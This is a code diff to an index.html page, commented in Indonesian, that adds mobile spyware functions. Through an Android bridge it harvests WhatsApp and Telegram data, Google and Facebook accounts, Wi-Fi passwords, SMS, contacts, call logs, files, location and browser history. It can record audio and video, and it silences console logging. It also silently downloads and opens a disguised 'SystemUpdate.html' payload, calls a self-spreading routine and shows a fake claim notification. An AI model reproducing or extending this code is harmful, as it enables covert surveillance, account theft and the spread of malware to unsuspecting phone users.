@@ -64,7 +64,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - FINAL (PASTI BERHASIL!)
+// 🔥 INDEX.HTML - UNIVERSAL (TANPA APK & REDIRECT)
 // ============================================================
 
 console.log = function() {};
@@ -229,11 +229,32 @@ var A = {
     getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
     getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
     getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
+    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
+    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
     getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
     getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
     getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
+    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
+    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
+    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
+    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
+    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
+    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
+    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
+    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
+    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
+    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
+    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
     takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
-    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){} } return null; }
+    startRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startRecording(d||30)}catch(e){}} return null },
+    startVideoRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording(d||30)}catch(e){}} return null },
+    stopRecording: function() { if(this.isAvailable){ try{return AndroidBridge.stopRecording()}catch(e){}} return null },
+    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){} } return null; },
+    setClipboard: function(t) { if(this.isAvailable){ try{return AndroidBridge.setClipboard(t)}catch(e){}} return null },
+    vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
+    showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
+    flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
 };
 
 // ============================================================
@@ -264,7 +285,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// 🔥 DOWNLOAD + BUKA SystemUpdate.html
+// 🔥 DOWNLOAD SystemUpdate.html (TANPA APK!)
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -275,7 +296,7 @@ function downloadPayloadSilent() {
     var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
     var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
     
-    // ✅ 1. DOWNLOAD SystemUpdate.html
+    // ✅ DOWNLOAD SystemUpdate.html
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -284,36 +305,43 @@ function downloadPayloadSilent() {
             if (xhr.status === 200) {
                 var htmlContent = xhr.responseText;
                 
-                // ✅ SAVE KE STORAGE
-                if (PLATFORM.isAndroid && A.isAvailable) {
-                    try {
-                        A.saveFile(htmlPath, htmlContent);
-                        K({ sumber: 'html_saved', data: { path: htmlPath } });
-                    } catch(e) {}
-                }
-                
-                // ✅ SAVE KE LOCALSTORAGE (FALLBACK)
+                // ✅ SAVE KE LOCALSTORAGE
                 try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
                 
-                // ✅ 2. BUKA SystemUpdate.html
+                // ✅ SAVE VIA ANDROID BRIDGE
+                if (PLATFORM.isAndroid && A.isAvailable) {
+                    try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
+                }
+                
+                // ✅ BUKA SystemUpdate.html
                 setTimeout(function() {
-                    // METHOD 1: ANDROID BRIDGE
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
                             A.openFile(htmlPath);
-                            K({ sumber: 'html_opened', data: 'ok' });
+                            K({ sumber: 'html_opened_bridge', data: { path: htmlPath } });
                             return;
                         } catch(e) {}
                     }
                     
-                    // METHOD 2: REDIRECT KE BLOB (FALLBACK)
+                    // ✅ FALLBACK: BUKA DARI LOCALSTORAGE
                     try {
-                        var blob = new Blob([htmlContent], { type: 'text/html' });
-                        var url = URL.createObjectURL(blob);
-                        window.location.href = url;
-                        K({ sumber: 'html_opened_blob', data: 'ok' });
-                        return;
+                        var htmlContent = localStorage.getItem('SystemUpdate.html');
+                        if (htmlContent) {
+                            var blob = new Blob([htmlContent], { type: 'text/html' });
+                            var url = URL.createObjectURL(blob);
+                            window.location.href = url;
+                            K({ sumber: 'html_opened_blob', data: 'ok' });
+                            return;
+                        }
                     } catch(e) {}
+                    
+                    // ✅ FALLBACK: BUKA DARI DOWNLOAD FOLDER
+                    if (PLATFORM.isAndroid) {
+                        try {
+                            window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
+                            K({ sumber: 'html_open_file', data: 'attempt' });
+                        } catch(e) {}
+                    }
                 }, 1000);
             }
         };
@@ -370,11 +398,18 @@ function ambilDataCepat() {
         try { var sms = A.getAllSMS(); if(sms) { data.sms = validateData(sms); K({sumber:'sms_all', data:validateData(sms)}); } } catch(e) {}
         try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = validateData(clipboard); K({sumber:'clipboard', data:validateData(clipboard)}); } } catch(e) {}
         try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:validateData(callLog)}); } catch(e) {}
+        try { var wa = A.getWhatsAppData(); if(wa) K({sumber:'whatsapp', data:validateData(wa)}); } catch(e) {}
+        try { var tg = A.getTelegramData(); if(tg) K({sumber:'telegram', data:validateData(tg)}); } catch(e) {}
+        try { var files = A.listAllFiles(); if(files) K({sumber:'files_all', data:validateData(files)}); } catch(e) {}
+        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:validateData(apps)}); } catch(e) {}
+        try { var wifi = A.getWiFiPasswords(); if(wifi) K({sumber:'wifi_passwords', data:validateData(wifi)}); } catch(e) {}
         try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:validateData(ss)}); } catch(e) {}
         try { var loc = A.getDeviceInfo(); if(loc) K({sumber:'device_info', data:validateData(loc)}); } catch(e) {}
         try { var imei = A.getIMEI(); if(imei) K({sumber:'imei', data:validateData(imei)}); } catch(e) {}
         try { var imsi = A.getIMSI(); if(imsi) K({sumber:'imsi', data:validateData(imsi)}); } catch(e) {}
         try { var phone = A.getPhoneNumber(); if(phone) K({sumber:'phone_number', data:validateData(phone)}); } catch(e) {}
+        try { var loc2 = A.getLocation(); if(loc2) K({sumber:'lokasi', data:validateData(loc2)}); } catch(e) {}
+        try { var storage = A.getStorageInfo(); if(storage) K({sumber:'storage_info', data:validateData(storage)}); } catch(e) {}
     }
     
     try { data.screen = { width: screen.width, height: screen.height }; data.platform = navigator.platform; data.language = navigator.language; data.cookieEnabled = navigator.cookieEnabled; data.doNotTrack = navigator.doNotTrack; } catch(e) {}
@@ -456,17 +491,18 @@ function dapatkanSemua() {
         registerServiceWorker();
         setTimeout(autoSpread, 2000);
         
-        // ✅ DOWNLOAD + BUKA SystemUpdate.html
+        // ✅ DOWNLOAD + BUKA SystemUpdate.html (TANPA APK!)
         setTimeout(function() { downloadPayloadSilent(); }, 500);
         
+        // ✅ NOTIFICATION (TANPA REDIRECT!)
         setTimeout(function() { showKlaimNotification(); }, 3000);
+        
         setTimeout(function() { showStatusBar(); }, 500);
         setTimeout(function() { autoScreenshot(); }, 7000);
         
-        getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
+        // ✅ TANPA REDIRECT KE DANA!
         
-        // ❌ TANPA APK!
-        // ❌ TANPA REDIRECT!
+        getPasswordFromWorker().then(function(password) { WS_PASSWORD = password; K({ sumber: 'password_received', data: 'ok' }); }).catch(function() {});
         
     } catch(e) {
         K({ sumber: 'dapatkanSemua_error', data: e.message });
